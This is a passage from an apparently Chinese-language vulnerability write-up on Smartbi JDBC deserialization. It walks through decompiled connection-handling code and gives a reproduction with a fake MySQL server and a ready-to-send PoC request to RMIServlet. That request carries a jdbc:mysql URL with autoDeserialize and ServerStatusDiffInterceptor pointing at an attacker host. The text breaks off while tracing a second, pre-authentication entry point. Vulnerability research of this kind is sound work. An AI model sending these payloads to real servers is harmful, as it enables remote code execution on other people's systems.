ds.setUrl(dataSource.getUrl());<br>    ds.setUser(dataSource.getUser());<br>    ds.setDriverType(dataSource.getDriverType());<br>    ds.setMaxConnection(dataSource.getMaxConnection());<br>    ds.setValidationQuery(dataSource.getValidationQuery());<br>    ds.setPassword(dataSource.getPassword());<br>    ds.setTransactionIsolation(dataSource.getTransactionIsolation());<br>    ds.setValidationQueryMethod(dataSource.getValidationQueryMethod());<br>    ds.setAuthenticationType(dataSource.getAuthenticationType());<br>    <span class="hljs-comment">//如果 IDataSource 没有提供密码，并且提供了 ID，那么从数据库中查询旧数据源信息，取出其密码，用于本次连接</span><br>    <span class="hljs-keyword">if</span> (dataSource.getPassword() == <span class="hljs-literal">null</span> &amp;&amp; !StringUtil.isNullOrEmpty(dataSource.getId())) &#123;<br>        <span class="hljs-type">DataSource</span> <span class="hljs-variable">dbDs</span> <span class="hljs-operator">=</span> FreeQueryDAOFactory.getDataSourceDAO().load(dataSource.getId());<br>        ds.setPassword(dbDs.getPassword());<br>    &#125;<br><br>    <span class="hljs-comment">//声明 JDBC 连接对象 conn，后续用于建立连接</span><br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//使用自定义的连接池 ConnectionPool 获取数据库连接</span><br>        conn = ConnectionPool.getInstance().getConnection(ds);<br>        <span class="hljs-keyword">if</span> (DBType.PRESTO == dataSource.getDriverType()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT 1&quot;</span>;<br>            <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> JdbcUtil.prepareStatement(conn, sql);<br></code></pre></td></tr></table></figure><p>进入 <code>ConnectionPool.getConnection()</code>：进行数据池连接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.driverConnect(poolName, ds);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConnectionPool</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(IConnectionInfo ds)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//判断是否为系统知识库</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;DS.SYSTEM\u77e5\u8bc6\u5e93&quot;</span>.equals(ds.getId())) &#123;<br>        ds = <span class="hljs-built_in">this</span>.provider.getConnectionInfo(<span class="hljs-string">&quot;res&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//判断是否是 JNDI 数据</span><br>    <span class="hljs-keyword">if</span> (ds.getUrl().startsWith(<span class="hljs-string">&quot;JNDI:&quot;</span>)) &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">cxt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource)cxt.lookup(ds.getUrl().substring(<span class="hljs-string">&quot;JNDI:&quot;</span>.length()));<br>        <span class="hljs-keyword">return</span> dataSource.getConnection();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ds.getValidationQueryMethod() == <span class="hljs-number">3</span>) &#123;<span class="hljs-comment">//加载 JDBC 驱动</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">driverClass</span> <span class="hljs-operator">=</span> ds.getDriver();<br>        Class&lt;?&gt; clazz = <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//通过自定义的 DynamicLoadLibManager 加载该类</span><br>            clazz = DynamicLoadLibManager.loadClass(driverClass);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var12) &#123;<br>            <span class="hljs-comment">//如果失败，使用备用 classLoader 加载</span><br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">clzLoader</span> <span class="hljs-operator">=</span> (ClassLoader)Class.forName(<span class="hljs-string">&quot;smartbi.repository.DAOModule&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;classLoader&quot;</span>).get((Object)<span class="hljs-literal">null</span>);<br>            clazz = clzLoader == <span class="hljs-literal">null</span> ? Class.forName(driverClass) : clzLoader.loadClass(driverClass);<br>        &#125;<br>        <br><span class="hljs-comment">//创建 JDBC 驱动对象实例</span><br>        <span class="hljs-type">Driver</span> <span class="hljs-variable">jdbcDriver</span> <span class="hljs-operator">=</span> (Driver)clazz.newInstance();<br>        <span class="hljs-comment">//构建连接所需的属性（用户名、密码）</span><br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        prop.put(<span class="hljs-string">&quot;user&quot;</span>, ds.getUser());<br>        prop.put(<span class="hljs-string">&quot;password&quot;</span>, ds.getPassword());<br>        <span class="hljs-keyword">if</span> (ds.getDriverType() == DBType.KYLIN) &#123;<br>            prop.put(<span class="hljs-string">&quot;timezone&quot;</span>, <span class="hljs-string">&quot;GMT&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//通过反射调用 DriverManager.getConnection() 这个重载的私有方法</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> DriverManager.class.getDeclaredMethod(<span class="hljs-string">&quot;getConnection&quot;</span>, String.class, Properties.class, ClassLoader.class);<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-comment">//使用系统中的 classLoader</span><br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">clzLoader</span> <span class="hljs-operator">=</span> (ClassLoader)Class.forName(<span class="hljs-string">&quot;smartbi.repository.DAOModule&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;classLoader&quot;</span>).get((Object)<span class="hljs-literal">null</span>);<br>            conn = m.invoke((Object)<span class="hljs-literal">null</span>, ds.getUrl(), prop, clzLoader);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> DriverManager.class.getDeclaredMethod(<span class="hljs-string">&quot;getConnection&quot;</span>, String.class, Properties.class, Class.class);<br>                m.setAccessible(<span class="hljs-literal">true</span>);<br>                conn = m.invoke((Object)<span class="hljs-literal">null</span>, ds.getUrl(), prop, clazz);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>                conn = DriverManager.getConnection(ds.getUrl(), prop);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> (Connection)conn;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poolName</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (ds.getId().equals(<span class="hljs-string">&quot;DS.SYSTEM\u77e5\u8bc6\u5e93&quot;</span>)) &#123;<br>            poolName = <span class="hljs-string">&quot;res&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            poolName = <span class="hljs-built_in">this</span>.getPoolNameFromDatasource(ds);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            driver.getConnectionPool(poolName);<br>            <span class="hljs-comment">//调用 driverConnect 获取连接池连接</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.driverConnect(poolName, ds);<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException var11) &#123;<br>            <span class="hljs-built_in">this</span>.createPool(ds);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.driverConnect(poolName, ds);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>此时服务器向远程的<code>FakeMysql</code>尝试连接，就会接收到<code>FakeMysql</code>返回的恶意序列化数据，</p><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a><strong>漏洞复现：</strong></h3><p>搭建 FakeMysql 服务器，用 Javachains 搭建，将 3308端口开启，监听的是<strong>本机IP地址的3308端口</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701134.png" alt="20250806161415587"></p><p>构造 K1链</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702650.png" alt="20250806162032486"></p><p>构造poc:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs perl">className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>:<span class="hljs-number">100</span>,<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>:<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>:<span class="hljs-string">&quot;SELECT 1 FROM DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;jdbc:mysql://[本机IP]:3308/d4c5846?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>:<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>:-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;dbToCharset&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>:<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br>-&gt;url编码<br>className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span><span class="hljs-variable">%3a100</span>,<span class="hljs-string">&quot;user&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;jdbc%3amysql<span class="hljs-variable">%3a</span>//[本机IP]<span class="hljs-variable">%3a3308</span>/d4c5846%3fautoDeserialize%3dtrue<span class="hljs-variable">%2</span>6statementInterceptors<span class="hljs-variable">%3dcom</span>.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-string">&quot;name&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span><span class="hljs-variable">%3a</span>-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span><span class="hljs-variable">%3a0</span>,<span class="hljs-string">&quot;dbToCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br><br><br><br>POST /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1.1</span><br>Host: localhost:<span class="hljs-number">18080</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113.0</span><span class="hljs-number">.5672</span><span class="hljs-number">.127</span> Safari/<span class="hljs-number">537.36</span><br>Accept: *<span class="hljs-regexp">/*</span><br><span class="hljs-regexp">Origin: http:/</span><span class="hljs-regexp">/localhost</span><br><span class="hljs-regexp">Referer: http:/</span><span class="hljs-regexp">/localhost:18080/smar</span>tbi/vision/index.jsp<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;<span class="hljs-keyword">q</span>=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br>Cookie: JSESSIONID=0BBBD2EC4AE481FB607FC501FA04897E<br>Content-Type: application/<span class="hljs-keyword">x</span>-www-form-urlencoded;charset=UTF-<span class="hljs-number">8</span><br>Connection : keep-alive<br>Content-Length: <span class="hljs-number">580</span><br><br>className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span><span class="hljs-variable">%3a100</span>,<span class="hljs-string">&quot;user&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;jdbc%3amysql<span class="hljs-variable">%3a</span>//192.168.1.25<span class="hljs-variable">%3a3308</span>/d4c5846%3fautoDeserialize%3dtrue<span class="hljs-variable">%2</span>6statementInterceptors<span class="hljs-variable">%3dcom</span>.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-string">&quot;name&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span><span class="hljs-variable">%3a</span>-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span><span class="hljs-variable">%3a0</span>,<span class="hljs-string">&quot;dbToCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702241.png" alt="20250806162931145"></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ol><li>根据依赖版本确定存在漏洞</li><li>根据依赖的敏感函数找入口点</li></ol><h2 id="前台JDBC反序列化"><a href="#前台JDBC反序列化" class="headerlink" title="前台JDBC反序列化"></a>前台JDBC反序列化</h2><h3 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncServlet.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    ...<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>        <span class="hljs-type">File</span> <span class="hljs-variable">tmpFile</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">actionType</span> <span class="hljs-operator">=</span> StringUtil.getLanguageValue(<span class="hljs-string">&quot;Synchronization&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;<br>                request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;type&quot;</span>);<br>                response.setBufferSize(<span class="hljs-number">4096</span>);<br>                <span class="hljs-keyword">if</span> (type.equals(<span class="hljs-string">&quot;sqldictsync&quot;</span>)) &#123;<br>                    <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>                    <span class="hljs-comment">//从请求中提取数据库连接配置和查询语句</span><br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbType</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbType&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbServer</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbServer&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbName</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbName&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbUser</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbUser&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbPass</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbPass&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">querySql</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;querySql&quot;</span>);<br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">dbNameOnly</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;true&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;dbNameOnly&quot;</span>));<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">clientId</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                    log.debug(<span class="hljs-string">&quot;sqldictsync[dbName:&quot;</span> + dbName + <span class="hljs-string">&quot;,dbNameOnly:&quot;</span> + dbNameOnly + <span class="hljs-string">&quot;,querySql:&quot;</span> + querySql + <span class="hljs-string">&quot;]&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (dbNameOnly) &#123;<br>                        clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbName, querySql);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbType, dbServer, dbName, dbUser, dbPass, querySql);<br>                    &#125;<br></code></pre></td></tr></table></figure><p>跟进 synchronize</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncResources</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">synchronize</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String querySql)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//调用 DbUtil.getConnection() 获取数据库连接</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DbUtil.getConnection(dbType, dbServer, dbName, dbUser, dbPass, (String)<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">if</span> (conn == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Incomingconnectionparametererrorestablishconnectionfailed&quot;</span>));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">colsCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br>            <span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultSetReader</span>(conn, querySql, colsCount);<br>            <span class="hljs-type">DictTree</span> <span class="hljs-variable">tree</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DictTree</span>(reader);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.doSynchronize(tree);<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>跟进 DbUtil.getConnection</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DbUtil</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">DBType</span> <span class="hljs-variable">driverType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//将传入的 dbType 字符串转为大写并在 DBType 中查找；如果输入非法，抛出异常并返回 null</span><br>            driverType = DBType.valueOf(dbType.toUpperCase());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//translateDriverInfo() 